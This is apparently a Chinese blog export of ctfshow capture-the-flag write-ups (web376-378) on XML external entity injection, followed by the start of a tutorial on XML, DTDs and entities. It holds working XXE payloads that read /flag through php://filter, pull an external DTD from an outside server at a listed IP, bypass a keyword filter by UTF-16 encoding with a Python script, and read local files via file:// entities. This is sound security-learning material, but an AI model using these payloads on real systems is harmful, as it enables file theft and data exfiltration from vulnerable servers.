<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:23:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>

<p>与上题的区别是多了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> 及其大小写。emmmm… web375 的绕过方法好像也没有大小写绕过啊？</p>
<p>那就直接用 web375 的方法好了</p>
<h1 id="web377"><a href="#web377" class="headerlink" title="web377"></a>web377</h1><p>先看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:26:55</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure>

<p>与上题的区别是多了如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> 和 <code>http</code> 及其大小写</p>
<p>我们先看一下原 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://81.71.4.233:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>有一个 <code>encoding=&quot;UTF-8&quot;</code> 的参数，那么我们就可以考虑除了 UTF-8 以外的其他编码，可以从 <a href="https://www.runoob.com/xml/xml-encoding.html">XML 编码 | 菜鸟教程 (runoob.com)</a> 中查看。</p>
<p>那我们取其中一个试试看：</p>
<p>先写一个编码转换的脚本（转 Unicode）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">utf8_str = <span class="built_in">input</span>(<span class="string">&quot;utf-8:&quot;</span>)</span><br><span class="line"></span><br><span class="line">unicode_str = utf8_str.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Unicode:&quot;</span>, unicode_str)</span><br></pre></td></tr></table></figure>

<p>编码后为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\xff\xfe&lt;\x00?\x00x\x00m\x00l\x00 \x00v\x00e\x00r\x00s\x00i\x00o\x00n\x00=\x00&quot;\x001\x00.\x000\x00&quot;\x00 \x00e\x00n\x00c\x00o\x00d\x00i\x00n\x00g\x00=\x00&quot;\x00U\x00T\x00F\x00-\x008\x00&quot;\x00?\x00&gt;\x00\n\x00\n\x00&lt;\x00!\x00D\x00O\x00C\x00T\x00Y\x00P\x00E\x00 \x00t\x00e\x00s\x00t\x00 \x00[\x00\n\x00&lt;\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00%\x00 \x00f\x00i\x00l\x00e\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00&quot;\x00p\x00h\x00p\x00:\x00/\x00/\x00f\x00i\x00l\x00t\x00e\x00r\x00/\x00r\x00e\x00a\x00d\x00=\x00c\x00o\x00n\x00v\x00e\x00r\x00t\x00.\x00b\x00a\x00s\x00e\x006\x004\x00-\x00e\x00n\x00c\x00o\x00d\x00e\x00/\x00r\x00e\x00s\x00o\x00u\x00r\x00c\x00e\x00=\x00/\x00f\x00l\x00a\x00g\x00&quot;\x00&gt;\x00\n\x00&lt;\x00!\x00E\x00N\x00T\x00I\x00T\x00Y\x00 \x00%\x00 \x00d\x00t\x00d\x00 \x00S\x00Y\x00S\x00T\x00E\x00M\x00 \x00&quot;\x00h\x00t\x00t\x00p\x00:\x00/\x00/\x00v\x00p\x00s\x00-\x00i\x00p\x00:\x008\x000\x000\x000\x00/\x00X\x00X\x00E\x00.\x00d\x00t\x00d\x00&quot;\x00&gt;\x00\n\x00%\x00d\x00t\x00d\x00;\x00\n\x00]\x00&gt;\x00\n\x00&#x27;</span><br></pre></td></tr></table></figure>

<p>但是直接放 Burp 里传不知道为什么成功不了</p>
<p>试了 python 爬虫倒是成功了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://819c130f-b2e1-4626-b9f8-8326d5ececbc.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%dtd;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">data = data.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/02/VPGSAM5s4NgQUeb.png" alt="image-20240402200146457"></p>
<h1 id="web378"><a href="#web378" class="headerlink" title="web378"></a>web378</h1><p>f12 发现可疑代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&#x27;text/javascript&#x27;</span>&gt;</span><span class="language-javascript"> </span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">doLogin</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="title function_">alert</span>(<span class="string">&quot;Please enter the username and password!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> data = <span class="string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">    $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">url</span>: <span class="string">&quot;doLogin&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">contentType</span>: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: data,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">dataType</span>: <span class="string">&quot;xml&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">anysc</span>: <span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">result</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">var</span> code = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">var</span> msg = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;msg&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">if</span>(code == <span class="string">&quot;0&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login fail!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">&quot;1&quot;</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login success!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        	&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        		$(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(<span class="string">&quot;error:&quot;</span> + msg);</span></span><br><span class="line"><span class="language-javascript">        	&#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(errorThrown + <span class="string">&#x27;:&#x27;</span> + textStatus);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;); </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码是一个 JavaScript 函数，名为<code>doLogin()</code>，它执行用户登录的操作。具体功能如下：</p>
<ol>
<li><p>获取用户输入的用户名和密码：</p>
<ul>
<li>通过<code>$(&quot;#username&quot;).val()</code>获取用户名输入框的值，存储在变量<code>username</code>中。</li>
<li>通过<code>$(&quot;#password&quot;).val()</code>获取密码输入框的值，存储在变量<code>password</code>中。</li>
</ul>
</li>
<li><p>检查用户名和密码是否为空：</p>
<ul>
<li>如果用户名或密码为空，则弹出警告框提示用户输入用户名和密码，并返回，不继续执行登录操作。</li>
</ul>
</li>
<li><p>构建XML格式的数据：</p>
<ul>
<li>使用用户输入的用户名和密码构建一个XML格式的字符串，如<code>&lt;user&gt;&lt;username&gt;user123&lt;/username&gt;&lt;password&gt;pass123&lt;/password&gt;&lt;/user&gt;</code>，存储在变量<code>data</code>中。</li>
</ul>
</li>
<li><p>发送Ajax请求：</p>
<ul>
<li>使用<code>$.ajax()</code>方法发送 POST 请求到 URL 为 “doLogin”。</li>
<li>设置请求头的内容类型为 XML ，编码为 UTF-8 。</li>
<li>发送构建好的 XML 数据。</li>
<li>期望响应的数据类型为 XML 。</li>
<li>设置<code>anysc</code>为 false ，表示同步请求。</li>
<li>定义请求成功的回调函数和请求失败的回调函数。</li>
</ul>
</li>
<li><p>处理响应：</p>
<ul>
<li>如果请求成功，从响应中提取<code>code</code>和<code>msg</code>，根据<code>code</code>的值显示不同的消息在页面上。</li>
<li>如果请求失败，显示错误消息在页面上。</li>
</ul>
</li>
</ol>
<p>显然又是 XXE，输入 admin&#x2F;admin 后看他发送的包更加明了一些：</p>
<p><img src="https://s2.loli.net/2024/04/02/iFLAJzIahG9Olf5.png" alt="image-20240402201520838"></p>
<p>payload 反而比前面几道简单：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">XEE</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">payload</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;payload;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;payload;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/04/02/OwET1C2ky7celi6.png" alt="image-20240402201914912"></p>
]]></content>
      <categories>
        <category>XXE</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE 学习记录</title>
    <url>/2024/03/11/XXE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>前言：</p>
<p>上上周的青少年CTF擂台挑战赛 2024 #Round 1中，有一道XXE的题目，结合我对 moectf 那道XXE的印象，感觉都是直接复制、黏贴答案模板后改改就出了，没有系统的认真学；趁着有想法的时候把 XXE 系统学个一遍。。。</p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="什么是-XXE？"><a href="#什么是-XXE？" class="headerlink" title="什么是 XXE？"></a>什么是 XXE？</h2><p>XXE 全称是：XML External Entity，也就是 XML 外部实体注入攻击，由于程序在解析输入的 XML 数据时，解析了攻击者伪造的外部实体而产生的。有XXE漏洞的标志性函数为<code>simplexml_load_string()</code>。漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。</p>
<h2 id="XML-基础学习（-XXE-要从认识-XML-开始）："><a href="#XML-基础学习（-XXE-要从认识-XML-开始）：" class="headerlink" title="XML 基础学习（ XXE 要从认识 XML 开始）："></a>XML 基础学习（ XXE 要从认识 XML 开始）：</h2><p>XML指可扩展标记语言（EXtensible Markup Language）是一种标记语言，很类似 HTML。XML的设计宗旨是传输数据，而非显示数据。XML标签没有被预定义。需要自行定义标签。XML被设计为具有自我描述性。XML是 W3C 的推荐标准。</p>
<h3 id="XML-是不作为的："><a href="#XML-是不作为的：" class="headerlink" title="XML 是不作为的："></a>XML 是不作为的：</h3><p>也许这有点难以理解，但是 XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。</p>
<p>下面是 John 写给 George 的便签，存储为 XML ：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面的这条便签具有自我描述性。它拥有标题以及留言，同时包含了发送者和接受者的信息。但是，这个 XML 文档仍然没有做任何事情。它仅仅是包装在 XML 标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。除此之外，XML 是纯文本，且允许创作者定义自己的标签和文档结构，是独立于软件和硬件的信息传输工具。</p>
<h2 id="DTD-："><a href="#DTD-：" class="headerlink" title="DTD ："></a>DTD ：</h2><p>文档类型定义（DTD）可定义合法的 XML 文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
<h3 id="一些前置XML元素知识："><a href="#一些前置XML元素知识：" class="headerlink" title="一些前置XML元素知识："></a>一些前置XML元素知识：</h3><h4 id=""><a href="#" class="headerlink" title="&lt;!ELEMENT&gt;"></a><code>&lt;!ELEMENT&gt;</code></h4><p>在XML中，<code>&lt;!ELEMENT&gt;</code> 元素用于定义元素的结构和内容模型。具体来说，<code>&lt;!ELEMENT&gt;</code> 元素可以用来：</p>
<ol>
<li>定义元素的名称：<code>&lt;!ELEMENT&gt;</code> 元素指定了XML文档中允许出现的元素的名称。</li>
<li>定义元素的内容模型：<code>&lt;!ELEMENT&gt;</code> 元素可以指定元素的内容模型，即元素可以包含哪些子元素以及它们的顺序和数量。</li>
</ol>
<p>例如，下面是一个使用 <code>&lt;!ELEMENT&gt;</code> 元素定义元素的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT person (firstname, lastname, age)&gt;</span><br></pre></td></tr></table></figure>

<p>在这个示例中，<code>&lt;!ELEMENT&gt;</code> 元素定义了一个名为”person”的元素，它包含了三个子元素：firstname、lastname 和 age。这样就规定了”person”元素的结构和内容模型。</p>
<p>通过使用 <code>&lt;!ELEMENT&gt;</code> 元素，可以在XML文档中明确定义元素的结构，有助于确保文档的有效性和一致性。</p>
<h4 id="-1"><a href="#-1" class="headerlink" title="&lt;!ENTITY&gt;"></a><code>&lt;!ENTITY&gt;</code></h4><p>在XML中，<code>&lt;!ENTITY&gt;</code> 元素用于定义实体。</p>
<h3 id="内部的-DOCTYPE-声明："><a href="#内部的-DOCTYPE-声明：" class="headerlink" title="内部的 DOCTYPE 声明："></a>内部的 DOCTYPE 声明：</h3><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>

<p>带有 DTD 的 XML 文档实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">	&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">	&lt;body&gt;Don not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>

<h4 id="以上-DTD-解释如下："><a href="#以上-DTD-解释如下：" class="headerlink" title="以上 DTD 解释如下："></a>以上 DTD 解释如下：</h4><p><strong>!DOCTYPE note</strong> (第二行)定义此文档是 <strong>note</strong> 类型的文档（note为根元素）。</p>
<p><strong>!ELEMENT note</strong> (第三行)定义 <strong>note</strong> 元素有四个元素：”to、from、heading、body”，如果是<code>&lt;!ELEMENT note ANY&gt;</code>则表示可以接受<strong>任何元素</strong></p>
<p><strong>!ELEMENT to</strong> (第四行)定义 <strong>to</strong> 元素为 “#PCDATA” 类型</p>
<p><strong>!ELEMENT from</strong> (第五行)定义 <strong>from</strong> 元素为 “#PCDATA” 类型</p>
<p><strong>!ELEMENT heading</strong> (第六行)定义 <strong>heading</strong> 元素为 “#PCDATA” 类型</p>
<p><strong>!ELEMENT body</strong> (第七行)定义 <strong>body</strong> 元素为 “#PCDATA” 类型</p>
<h3 id="外部文档声明："><a href="#外部文档声明：" class="headerlink" title="外部文档声明："></a>外部文档声明：</h3><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">	&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">	&lt;body&gt;Don not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt; </span><br></pre></td></tr></table></figure>

<p>这是包含 DTD 的 “note.dtd” 文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="DTD的作用："><a href="#DTD的作用：" class="headerlink" title="DTD的作用："></a>DTD的作用：</h3><ul>
<li>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</li>
<li>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</li>
<li>您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。</li>
<li>您还可以使用 DTD 来验证您自身的数据。</li>
</ul>
<h3 id="实体："><a href="#实体：" class="headerlink" title="实体："></a>实体：</h3><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。</p>
<h4 id="实体类别与引用："><a href="#实体类别与引用：" class="headerlink" title="实体类别与引用："></a>实体类别与引用：</h4><h5 id="通用实体："><a href="#通用实体：" class="headerlink" title="通用实体："></a>通用实体：</h5><p>用 <code>&amp;实体名;</code> 引用的实体，他在 DTD 中定义，在 XML 文档中引用</p>
<p>实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [</span><br><span class="line">    &lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;/firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;/updateProfile&gt;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，实体 <code>&amp;file;</code> 引用了位于”file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini”路径下的文件。</p>
<h5 id="参数实体："><a href="#参数实体：" class="headerlink" title="参数实体："></a>参数实体：</h5><p>使用 <code>% 实体名</code>（<strong>这里面空格不能少</strong>） 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>和通用实体一样，参数实体也可以外部引用</p>
<p>实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">    &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">    &lt;message&gt;%an-element; %remote-dtd;&lt;/message&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这个示例中：</p>
<p>第一个参数实体定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>这个参数实体名为”an-element”，其内容是一个用于定义元素结构的字符串，指定了一个名为”mytag”的元素，它包含一个名为”subtag”的子元素。</p>
<p>第二个参数实体定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>这个参数实体名为”remote-dtd”，其内容是一个外部实体引用，指定了一个外部DTD文件的位置。</p>
<p>通过使用参数实体，我们可以在XML文档中定义可重复使用的片段，提高文档的可读性和可维护性。</p>
